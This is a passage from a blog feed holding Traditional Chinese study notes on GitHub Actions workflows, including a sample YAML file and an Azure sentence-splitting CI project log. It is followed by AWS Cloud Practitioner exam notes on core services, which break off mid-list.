路徑底下</li><li>一個Repo可以有多個Workflows，並負責執行各種不同的任務<ul><li>像是，一個用於Build跟Test的Workflow</li><li>另一個則是在Release發布後部署應用到生產環境的Workflow</li></ul></li></ul><h2 id="✴️Events"><a href="#✴️Events" class="headerlink" title="✴️Events"></a>✴️Events</h2><p>Event代表在Repository中的特定行為，像是:</p><ul><li>pull request</li><li>open issues</li><li>psuhes a commit to repo …etc</li></ul><p>用於觸發Workflows的Event可以參考這份文件<br><a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows</a></p><h2 id="🗂️Jobs"><a href="#🗂️Jobs" class="headerlink" title="🗂️Jobs"></a>🗂️Jobs</h2><p>一組Steps被稱作Job,並且執行在Runner上，每個Steps可能會是一個Shell Script或是Action被執行。Steps會依序執行，且由於每個Steps是在相同的Runner上被執行，因此可以在不同Steps之間共享相同資料。 舉例： 一個step建置完應用後另一個step來測試應用。</p><p>你也可以設定Jobs的依賴項，一旦一個Jobs依賴另一個Job，則會等待另一個Job完成後才開始執行自己的任務。<br><a href="https://docs.github.com/en/actions/using-jobs">https://docs.github.com/en/actions/using-jobs</a></p><h2 id="📑Actions"><a href="#📑Actions" class="headerlink" title="📑Actions"></a>📑Actions</h2><p>Action是一個專為Github Action平台設計的程序，可執行複雜、高頻率且重複的工作。<br>透過Action可以減少出現在workflow檔案中大量重複的程式碼。<br>一個Action可以做到像是從Github當中拉取repository，並為所建置的環境設定正確的工具集，並設定好與你的雲端供應用商之間的身分驗證。</p><p>設定Action:<a href="https://docs.github.com/en/actions/creating-actions">https://docs.github.com/en/actions/creating-actions</a></p><h2 id="📦Runners"><a href="#📦Runners" class="headerlink" title="📦Runners"></a>📦Runners</h2><p>用於運行workflow的Server，每個Runner一次只會執行一個Job。<br>Github提供 Ubuntu、Windows以及MacOS Runner來執行Workflow。<br>也會大型Runner需求者提供解決方案:<a href="https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners">https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners</a><br>若所需執行環境需要不同的OS或特規硬體設定，使用者也可以host自己的Runner <a href="https://docs.github.com/en/actions/hosting-your-own-runners">https://docs.github.com/en/actions/hosting-your-own-runners</a></p><h2 id="建立-Workflow"><a href="#建立-Workflow" class="headerlink" title="建立 Workflow"></a>建立 Workflow</h2><p>Github Action 使用YAML來建立Workflow。每個 Workflow 都以獨立的YAML檔儲存，並且放置在 <code>.github/workflows</code> 路徑底下</p><h2 id="建立範例-Workflows"><a href="#建立範例-Workflows" class="headerlink" title="建立範例 Workflows"></a>建立範例 Workflows</h2><ul><li>建立路徑:  <code>.gituhb/workflows</code></li><li>在 <code>.github/workflows</code> 當中建立 <code>learn-github-action.yml</code><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span></span><br><span class="line"><span class="attr">run-name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.actor</span> <span class="string">&#125;&#125;</span> <span class="string">is</span> <span class="string">learning</span> <span class="string">GitHub</span> <span class="string">Actions</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">check-bats-version:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span></span><br></pre></td></tr></table></figure></li><li>commit 這次的更動，並 push 到 repository</li></ul><h2 id="Workflows-File-逐行解釋"><a href="#Workflows-File-逐行解釋" class="headerlink" title="Workflows File 逐行解釋"></a>Workflows File 逐行解釋</h2><p>參考: <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore">Workflow Syntax</a></p><ul><li><code>name</code> : 指定Workflow名稱，並會出現在Repository中的Action Tab</li><li><code>run-name</code> : 每次運行該Workflow時會出現的文字訊息，這邊指定 repo username + “is learning Github Actions”</li></ul><p><img src="https://i.imgur.com/B5l23tf.png"></p><ul><li><code>on</code> : 指定會觸發 Workflows 的行為，這裡使用 <code>push</code> event，所以依但有人 push更動到 repository，則會觸發 Workflows的執行</li><li><code>jobs</code> : 將 Workflows當中的job組合在一起</li><li><code>check-bats-version</code> : 自定義Job的名稱</li><li><code>runs-on</code>: 設定Job執行在OS為最新版本的Ubuntu Linux的Runner上，此指定會觸發Hosted所託管的虛擬機被建立。</li><li><code>steps</code>: 將 <code>check-bats-version</code> job 底下的所有step組合再一起</li><li><code>uses</code>:　用來指定step的命令或行為<ul><li><code>actions/checkout@v3</code>: 代表要執行v3版本的actions&#x2F;checkout行為，<strong>此步驟會將你的repo checkout到Runner上，並允許你針對你的程式進行操作，每當你的Workflow將針對Repository的程式運行時，都應該使用 checkout 操作</strong></li><li><code>actions/setup-node@v3</code>: 此步驟會安裝指定版本的NodeJS(此範例中視版本1)</li></ul></li><li><code>run</code> : run指令會告訴 job在Runner中執行特定指令，此範例終究是告訴Job在Runner中執行 npm install bats，以及下一步則是去查看 bats版本</li></ul><h2 id="尋找以及自定義-Actions"><a href="#尋找以及自定義-Actions" class="headerlink" title="尋找以及自定義 Actions"></a>尋找以及自定義 Actions</h2><p>一個Action可以被定義在:</p><ul><li>與你Workflow檔案相同的Repository當中</li><li>所有公開的Repository</li><li>DockerHub中的已發布的容器image當中</li></ul><h3 id="Github-Action-Martketplace"><a href="#Github-Action-Martketplace" class="headerlink" title="Github Action Martketplace"></a>Github Action Martketplace</h3><p><a href="https://github.com/marketplace?type=actions">Marketplace連結</a></p><p><img src="https://i.imgur.com/oFXdxsj.png"></p><p>在Marketplace 當中有許多其他貢獻者所提供的Action，可以下載</p><p><img src="https://i.imgur.com/TFdKxou.png"></p><p>每個Action當中會有提供相應的YAML Synatx可以複製並貼上至自己的Workflow檔案當中，若Action需要你提供Input，則需要額外設定Workflow，可參考這份文件<br>，<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action</a></p><h3 id="在相同Repository底下添加-Action"><a href="#在相同Repository底下添加-Action" class="headerlink" title="在相同Repository底下添加 Action"></a>在相同Repository底下添加 Action</h3><p><em>範例檔案結構</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|-- hello-world (repository)</span><br><span class="line">|   |__ .github</span><br><span class="line">|       └── workflows</span><br><span class="line">|           └── my-first-workflow.yml</span><br><span class="line">|       └── actions</span><br><span class="line">|           |__ hello-world-action</span><br><span class="line">|               └── action.yml</span><br></pre></td></tr></table></figure><p><em>範例 Workflow 檔</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jobs:</span><br><span class="line">  build:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">      # This step checks out a copy of your repository.</span><br><span class="line">      - uses: actions/checkout@v3</span><br><span class="line">      # This step references the directory that contains the action.</span><br><span class="line">      - uses: ./.github/actions/hello-world-action</span><br></pre></td></tr></table></figure><p>synatx: <code>./path/to/dir</code></p><p>而 action.yml 是為了Action提供Metadata用的。</p><h3 id="從不同-Repository-加入-Action"><a href="#從不同-Repository-加入-Action" class="headerlink" title="從不同 Repository 加入 Action"></a>從不同 Repository 加入 Action</h3><p>這時在你的workflow檔當中的 use 底下就需要指定 <code>&#123;owner&#125;/&#123;repo&#125;@&#123;ref&#125;</code> 來標明 reference action的repo，範例:  <code>actions/setup-node@v3</code></p><h3 id="引用-DockerHub上的容器"><a href="#引用-DockerHub上的容器" class="headerlink" title="引用 DockerHub上的容器"></a>引用 DockerHub上的容器</h3><p>此時 syntax需要改成: <code>docker://&#123;image&#125;:&#123;tag&#125;</code></p><h2 id="實作-Azure-Break-Sentence-CI-x2F-CD-Pipeline"><a href="#實作-Azure-Break-Sentence-CI-x2F-CD-Pipeline" class="headerlink" title="實作: Azure Break Sentence CI&#x2F;CD Pipeline"></a>實作: Azure Break Sentence CI&#x2F;CD Pipeline</h2><p><em>整體架構圖</em><br><img src="https://i.imgur.com/OvSfq3m.png"></p><h3 id="Event需求"><a href="#Event需求" class="headerlink" title="Event需求"></a>Event需求</h3><h3 id="Runner-環境套件設定"><a href="#Runner-環境套件設定" class="headerlink" title="Runner 環境套件設定"></a>Runner 環境套件設定</h3><ul><li>OS: Ubuntu Linux</li><li>Python 3.8.10</li><li>Environment Variables<ul><li>AZURE_API_KEY</li><li>AZURE_LOCATION</li></ul></li></ul><blockquote><p>感覺可以自定義Actions</p></blockquote><h3 id="Break-Sentence"><a href="#Break-Sentence" class="headerlink" title="Break Sentence"></a>Break Sentence</h3><p><img src="https://i.imgur.com/kd6kJ2X.png"></p><p>🧪目標: <strong>在使用者上傳檔案時，就能夠擷取裡面的文章，去呼叫BreakSentence.py 進行斷句，再保存到特定Ouput Folder</strong></p><h3 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h3><ul><li><input checked="" disabled="" type="checkbox"> Azure API Key 被Disable  -&gt; 變更信箱重新註冊或付費續訂</li><li><input checked="" disabled="" type="checkbox"> 測試 YML檔透過環境變數方式來存取Secrets</li><li><input checked="" disabled="" type="checkbox"> 變更Repository中所存放的Secrets值</li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; 需加上讀檔功能<ul><li><input disabled="" type="checkbox"> 可能要可以開文字檔以及Excel檔</li></ul></li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; 要包裝成指令工具</li></ul><p><img src="https://i.imgur.com/xnAfxMl.png"><br><del>目前在Setup Python就會出錯</del> ✅已解決</p><p><img src="https://i.imgur.com/Sz9BA33.png"><br><del>沒有指定 Module，需用pip 指令安裝特定模組</del> ✅已解決</p><p><img src="https://i.imgur.com/McSwZ3L.png"><br><del>無法存取Secret中的值作為環境變數</del> ✅已解決<br>需要將env 區段放到run breaksentence.py的區段底下<br><img src="https://i.imgur.com/tlKx4k7.png"></p><p><img src="https://i.imgur.com/2AFUYyK.png"><br>執行成功 </p><p><img src="https://i.imgur.com/ortWe1v.png"></p><p>目前腳本中只有把api call的reponse印出來以及切句子存在List<br>下一步驟就是改變輸入輸出方式</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1]<a href="https://ithelp.ithome.com.tw/articles/10266827">https://ithelp.ithome.com.tw/articles/10266827</a><br>[2]<a href="https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions">https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions</a><br>[3]<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions</a><br>[4] <a href="https://ithelp.ithome.com.tw/articles/10266828">Github Action Push到Azure雲端</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🔋 AWS Certified Cloud Practitioner 證照準備筆記</title>
      <link href="/posts/e8acb5ee.html"/>
      <url>/posts/e8acb5ee.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/x1Sq6so.png"></p><h1 id="CCP-準備"><a href="#CCP-準備" class="headerlink" title="CCP 準備"></a>CCP 準備</h1><ul><li><p><strong>考試指南</strong>: <a href="https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf">https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf</a></p></li><li><p><strong>考試題型占比</strong><br><img src="https://i.imgur.com/xv5xcGu.png"></p></li><li><p><strong>相關資源</strong></p><ul><li><a href="https://terahake.in/post/aws-ccp-certified-exp/">https://terahake.in/post/aws-ccp-certified-exp/</a></li><li><a href="https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490">https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490</a></li><li><a href="https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU">https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU</a></li><li><a href="https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08">https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08</a></li><li><a href="https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ">https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ</a></li><li><a href="http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html">http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html</a></li></ul></li><li><p><strong>模擬考體</strong></p><ul><li><a href="https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/">https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/</a></li></ul></li></ul><h2 id="Well-Architect五大支柱"><a href="#Well-Architect五大支柱" class="headerlink" title="Well-Architect五大支柱"></a>Well-Architect五大支柱</h2><ul><li>卓越營運<ul><li>能夠執行和監控系統以實現商業價值，並持續提升支援流程和程序的能力。</li></ul></li><li>安全性<ul><li>是保護資訊、系統和資產，同時透過風險評估和緩解策略來實現商業價值的能力</li></ul></li><li>可靠性<ul><li>從基礎設施或服務中斷中恢復</li><li>動態取得運算資源以滿足需求</li><li>減少配置不當或暫時性網路問題等中斷情況</li></ul></li><li>效能達成效率<ul><li>用運算資源以符合系統需求，並在需求變化和技術升級時維持效率的能力</li></ul></li><li>成本最佳化<ul><li>是能以最低價格點執行系統來提供商業價值的能力。</li></ul></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="Amazon-Athena"><a href="#Amazon-Athena" class="headerlink" title="Amazon Athena"></a>Amazon Athena</h3><ul><li>透過標準SQL互動式Query來在S3當中分析資料</li><li>無伺服器</li><li>可定義Schema並藉由SQL來在S3當中分析資料</li></ul><h3 id="Amazon-Kinesis"><a href="#Amazon-Kinesis" class="headerlink" title="Amazon Kinesis"></a>Amazon Kinesis</h3><ul><li>可以輕鬆地蒐集、處例並分析即時串流資料</li><li>像是影音串流、應用程式日誌、網頁點擊分析、IoT遙測資料等等<ul><li>Amazon Kinesis Data Firhose</li><li>Amazon Kinesis Data Analytics</li><li>Amazon Kinesis Data Streams</li><li>Amazon Kinesis Video Streams</li></ul></li></ul><h3 id="Amazon-QuickSight"><a href="#Amazon-QuickSight" class="headerlink" title="Amazon QuickSight"></a>Amazon QuickSight</h3><ul><li>強大的BI(Business intelligent)服務</li><li>可建立互動式dashboard</li></ul><h2 id="應用程式整合"><a href="#應用程式整合" class="headerlink" title="應用程式整合"></a>應用程式整合</h2><h3 id="Amazon-Simple-Notification-Service-Amazon-SNS"><a href="#Amazon-Simple-Notification-Service-Amazon-SNS" class="headerlink" title="Amazon Simple Notification Service (Amazon SNS)"></a>Amazon Simple Notification Service (Amazon SNS)</h3><ul><li>一種發布&#x2F;訂閱服務。如使用 Amazon SNS 主題，發布者可將訊息發布給訂閱者。這種方式如同在咖啡店裡，收銀員向製作飲料的咖啡師提供咖啡訂單一樣。</li><li>在 Amazon SNS 中，訂閱者可能是 Web 伺服器、電子郵件地址、AWS Lambda 函數或其他幾種選項</li></ul><h3 id="Amazon-Simple-Queue-Service-Amazon-SQS"><a href="#Amazon-Simple-Queue-Service-Amazon-SQS" class="headerlink" title="Amazon Simple Queue Service (Amazon SQS)"></a>Amazon Simple Queue Service (Amazon SQS)</h3><ul><li>Amazon Simple Queue Service (Amazon SQS) 是一種訊息佇列服務</li><li>在 Amazon SQS 中，應用程式會將訊息傳送到佇列中。使用者或服務會從佇列擷取訊息，加以處理後，從佇列中刪除訊息</li><li></li></ul><h2 id="運算和無伺服器"><a href="#運算和無伺服器" class="headerlink" title="運算和無伺服器"></a>運算和無伺服器</h2><h3 id="AWS-Batch"><a href="#AWS-Batch" class="headerlink" title="AWS Batch"></a>AWS Batch</h3><h3 id="Amazon-EC2"><a href="#Amazon-EC2" class="headerlink" title="Amazon EC2"></a>Amazon EC2</h3><ul><li>執行個體類型<ul><li>一般用途<ul><li>應用程式中的運算、記憶體和網路功能資源需求大致相同</li></ul></li><li>運算最佳化<ul><li>需要運算密集型的應用</li><li>需要處理單一群組中有多筆交易的批次處理工作負載時，您也可以使用運算最佳化執行個體</li></ul></li><li>記憶體最佳化<ul><li>在於為記憶體內處理大型資料集的工作負載提供快速效能。在運算中，記憶體是暫時儲存區。它會保留中央處理單元（CPU）完成動作所需的所有資料和指令。</li><li>工作負載需要在執行應用程式之前預先載入大量資料。此種情況可能是高效能資料庫，或者需要執行大量非結構化資料即時處理的工作負載</li></ul></li><li>加速運算最佳化<ul><li>使用硬體加速器或協同處理器來提高執行某些功能的效率，其效果更勝在 CPU 上執行軟體的可行效率</li><li>使用硬體加速器或協同處理器來提高執行某些功能的效率，其效果更勝在 CPU 上執行軟體的可行效率</li></ul></li><li>儲存最佳化<ul><li>專為需要對本機儲存體上的超大型資料集進行高序列讀取及寫入存取工作負載所設計。適合儲存最佳化執行個體的工作負載包括分散式檔案系統、資料倉儲應用程式，以及高頻線上交易處理 (OLTP) 系統</li><li>為應用程式提供每秒數萬次低延遲的隨機 I&#x2F;O 操作 (IOPS) 而設計</li><li>應用程式具有高 IOPS 需求</li></ul></li></ul></li><li>EC2 定價<ul><li>隨需(On-Demand)<ul><li>適用不可中斷短期的工作負載</li><li>無須合約</li></ul></li><li>Saving Plan<ul><li>承諾一年或三年內維持一定的運算量</li><li>比隨需便宜</li></ul></li><li>預留執行個體<ul><li>可購買一年或三年期的執行個體</li><li>用量可以根據帳戶中的隨需執行個體而定</li></ul></li><li>Spot執行個體<ul><li>適合可以承受中斷的應用</li><li>像是批次任務</li></ul></li><li>專用主機<ul><li>實體EC2伺服器</li></ul></li></ul></li></ul><h3 id="AWS-Elastic-Beanstalk"><a href="#AWS-Elastic-Beanstalk" class="headerlink" title="AWS Elastic Beanstalk"></a>AWS Elastic Beanstalk</h3><ul><li>在您提供程式碼和組態設定後，Elastic Beanstalk 會負責部署執行下列任務所需的資源<ul><li>調整容量</li><li>負載平衡</li><li>自動擴展</li><li>應用程式運作狀態監控</li></ul></li></ul><h3 id="AWS-Lambda"><a href="#AWS-Lambda" class="headerlink" title="AWS Lambda"></a>AWS Lambda</h3><p><img src="https://i.imgur.com/iOCFQm5.png"></p><h3 id="Amazon-Lightsail"><a href="#Amazon-Lightsail" class="headerlink" title="Amazon Lightsail"></a>Amazon Lightsail</h3><ul><li>Amazon Lightsail 以經濟高效的每月價格，提供易於使用的虛擬私有伺服器 (VPS) 執行個體、容器、儲存、資料庫等。</li></ul><h3 id="Amazon-WorkSpaces"><a href="#Amazon-WorkSpaces" class="headerlink" title="Amazon WorkSpaces"></a>Amazon WorkSpaces</h3><ul><li>Amazon WorkSpaces 是一種用於 Windows 和 Linux 的全受管桌面虛擬化服務，可讓您從任何支援的裝置存取資源。</li></ul><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="Amazon-Elastic-Container-Service-Amazon-ECS"><a href="#Amazon-Elastic-Container-Service-Amazon-ECS" class="headerlink" title="Amazon Elastic Container Service (Amazon ECS)"></a>Amazon Elastic Container Service (Amazon ECS)</h3><ul><li>是可高度擴展的高效能容器管理系統，可讓您在 AWS 上輕鬆執行及擴展容器化應用程式</li><li>支援Docker</li></ul><h3 id="Amazon-Elastic-Kubernetes-Service-Amazon-EKS"><a href="#Amazon-Elastic-Kubernetes-Service-Amazon-EKS" class="headerlink" title="Amazon Elastic Kubernetes Service (Amazon EKS)"></a>Amazon Elastic Kubernetes Service (Amazon EKS)</h3><ul><li>透過它即可在 AWS 上執行 Kubernetes</li><li></li></ul><h3 id="AWS-Fargate"><a href="#AWS-Fargate" class="headerlink" title="AWS Fargate"></a>AWS Fargate</h3><ul><li>容器專用的無伺服器運算引擎，Amazon ECS 和 Amazon EKS 都適用。</li></ul><h2 id="資料庫"><a href="#資料庫" class="headerlink" title="資料庫"></a>資料庫</h2><h3 id="Amazon-Aurora"><a href="#Amazon-Aurora" class="headerlink" title="Amazon Aurora"></a>Amazon Aurora</h3><ul><li>企業級關聯式資料庫，比標準MySQL快5倍，比標準PostgreSQL快3倍</li><li>支援兩種資料庫選項: MySQL, PostgreSQL</li><li>成本極低</li><li>資料會被複寫到各項設施(隨時會有六份副本，最高可達15個讀取副本)</li><li>持續備份到Amazon S3</li><li>Point-in Time復原</li></ul><h3 id="Amazon-DynamoDB"><a href="#Amazon-DynamoDB" class="headerlink" title="Amazon DynamoDB"></a>Amazon DynamoDB</h3><ul><li>無伺服器資料庫，無須管理基礎執行個體或基礎設施</li><li>建立<strong>表格</strong>，以存放或查看資料</li><li>資料會被劃分成項目(Item)，項目具有屬性(Attribute)</li><li>屬性代表資料中的不同功能</li><li>會在多個可用區域當中儲存硬碟鏡像，提高可用性</li><li>高效能且可大規模擴展，回應時間為毫秒級</li><li>屬於NoSQL 資料庫</li><li>無法透過SQL進行查詢，可根據KEY屬性來進行查詢，靈活性高</li><li>使用案例: Amazon Prime Day應付大量使用者訂單請球</li></ul><h3 id="Amazon-ElastiCache"><a href="#Amazon-ElastiCache" class="headerlink" title="Amazon ElastiCache"></a>Amazon ElastiCache</h3><ul><li>為資料庫提供快取層，增加資料庫讀寫速度<ul><li>Memcached</li><li>Redis</li></ul></li></ul><h3 id="Amazon-DAX-DynamoDB-Accelerator"><a href="#Amazon-DAX-DynamoDB-Accelerator" class="headerlink" title="Amazon DAX(DynamoDB Accelerator)"></a>Amazon DAX(DynamoDB Accelerator)</h3><ul><li>為DynamoDB提供原生快速層，改善NoSQL資料讀取時間</li></ul><h3 id="Amazon-Relational-Database-Service-RDS"><a href="#Amazon-Relational-Database-Service-RDS" class="headerlink" title="Amazon Relational Database Service(RDS)"></a>Amazon Relational Database Service(RDS)</h3><ul><li>為<code>關聯式資料庫管理服務</code> (資料會已與其他資料建立關聯的方式來儲存)</li><li><h2 id="支援大多資料庫引擎-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server"><a href="#支援大多資料庫引擎-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server" class="headerlink" title="支援大多資料庫引擎  - Amazon Aurora  - MySQL  - PostgreSQL  - MaraDB  - Oracle  - Micorsoft SQL Server"></a>支援大多資料庫引擎<br>  - Amazon Aurora<br>  - MySQL<br>  - PostgreSQL<br>  - MaraDB<br>  - Oracle<br>  - Micorsoft SQL Server</h2></li><li>優點<ul><li>自動修補漏洞</li><li>備份</li><li>冗餘</li><li>容錯移轉</li><li>災難復原</li></ul></li><li>可進一步將它們部署至Amazon Aurora</li></ul><h3 id="Amazon-Redshift"><a href="#Amazon-Redshift" class="headerlink" title="Amazon Redshift"></a>Amazon Redshift</h3><ul><li>專為高速、即時擷取和查詢的資料庫，用於資料分析工作</li><li>大多關聯式資料庫容量有一定限制，因此不適合用於歷史資料分析</li><li>且資料種類繁雜，一班關聯式資料庫難易應付，因此這時需要<strong>資料倉儲(Data Warehouse)</strong></li><li>資料倉儲負責處理大數據，適用於歷史分析而不是營運分析</li><li>例如，一小時前我們的販售量如何，這種數字已經不會再變動了</li><li>而一般營運分析則是，我們現在的咖啡庫存如何，這種隨時在變動的資料</li><li>Redshift 可以實現傳統資料庫的10倍效能</li></ul><h3 id="AWS-Database-Migration-Service-Amazon-DMS"><a href="#AWS-Database-Migration-Service-Amazon-DMS" class="headerlink" title="AWS Database Migration Service(Amazon DMS)"></a>AWS Database Migration Service(Amazon DMS)</h3><ul><li>將客戶資料庫轉移至AWS</li><li>在遷移期間資料庫仍然能夠保持完全運作</li><li>仰賴該資料庫的應用程式停機時間能夠降至最低</li><li>來源與目標資料庫不用式相通類型的資料庫<ul><li>Oracle -&gt;RDS for Oracle</li><li>MySQL -&gt; RDS for MySQL</li></ul></li><li>異質遷移<ul><li>來淵資料庫以及目標資料庫的 <strong>結構描述(Schema)結構</strong>、<strong>資料類型</strong>、<strong>資料庫程式碼</strong> 不同時，就需要異質遷移</li><li>需要兩步驟<ul><li><ol><li>AWS Schema Conversion Tool進行轉換</li></ol></li><li><ol start="2"><li>DMS 用來遷移資料庫</li></ol></li></ul></li></ul></li><li>開發和測試資料庫遷移<ul><li>將資料庫副本遷移到生產或測試環境，可使用DMS服務</li></ul></li><li>資料庫合併</li><li>持續資料庫複寫<ul><li>可用於災難復原</li></ul></li></ul><h3 id="AWS-DocumentDB"><a href="#AWS-DocumentDB" class="headerlink" title="AWS DocumentDB"></a>AWS DocumentDB</h3><ul><li>用於完整文件儲存</li><li>適合內容管理、目錄、使用者設定檔</li></ul><h3 id="Amazon-Neptune"><a href="#Amazon-Neptune" class="headerlink" title="Amazon Neptune"></a>Amazon Neptune</h3><ul><li>圖形式資料庫用於社群網路和推薦引擎設計</li><li>也適合詐騙偵測需求</li><li>或者供應鏈追蹤管理</li></ul><h3 id="Amazon-QLDB-Quantum-Ledger-Database"><a href="#Amazon-QLDB-Quantum-Ledger-Database" class="headerlink" title="Amazon QLDB(Quantum Ledger Database)"></a>Amazon QLDB(Quantum Ledger Database)</h3><ul><li>不可變的紀錄系統</li><li>其中所有條目都無法存稽核中刪除</li></ul><h3 id="AWS-Auto-Scaling"><a href="#AWS-Auto-Scaling" class="headerlink" title="AWS Auto Scaling"></a>AWS Auto Scaling</h3><p><img src="https://i.imgur.com/6uOa7tx.png"></p><ul><li>動態擴展</li><li>預測性擴展<br><img src="https://i.imgur.com/oPepLm4.png"></li></ul><h3 id="AWS-CloudFormation"><a href="#AWS-CloudFormation" class="headerlink" title="AWS CloudFormation"></a>AWS CloudFormation</h3><ul><li>您可以將基礎設施當作程式碼(IaC)來處理。也就是說，您可以透過撰寫程式碼行來建立環境，無需使用 AWS 管理主控台個別佈建資源。</li><li>讓您不必執行手動動作或撰寫自訂指令碼，就能頻繁建立基礎設施和應用程式。它會在管理堆疊時判斷需要執行的正確作業，並在偵測到錯誤時自動復原變更。</li></ul><h3 id="AWS-CloudTrail"><a href="#AWS-CloudTrail" class="headerlink" title="AWS CloudTrail"></a>AWS CloudTrail</h3><ul><li>全方位的API稽核工具</li><li>所有對AWS提出的API請求，都會記錄在CloudTrail中</li><li>並且記錄誰提出請求，何時發出請求，IP為只為和，回應又是甚麼等等</li><li>可以在s3 bucket當中無期限儲存這些日誌</li><li>CloudTrail 中的事件通常會在 API 呼叫後的 15 分鐘內更新</li></ul><h3 id="Amazon-CloudWatch"><a href="#Amazon-CloudWatch" class="headerlink" title="Amazon CloudWatch"></a>Amazon CloudWatch</h3><ul><li>CloudWatch可以讓客戶監控aws基礎設施以及運行在上面的應用程式</li><li>他透過追蹤以及監控<strong>指標(與資源相關的變數)</strong> 來運作<ul><li>CPU使用率</li><li>RAM使用狀態</li></ul></li><li>CloudWatch 警示(Alerm)<ul><li>當指標達到閥值，可以觸發警示</li><li>整合SNS，可以傳送警示簡訊</li></ul></li><li>CloudWatach Dashboard 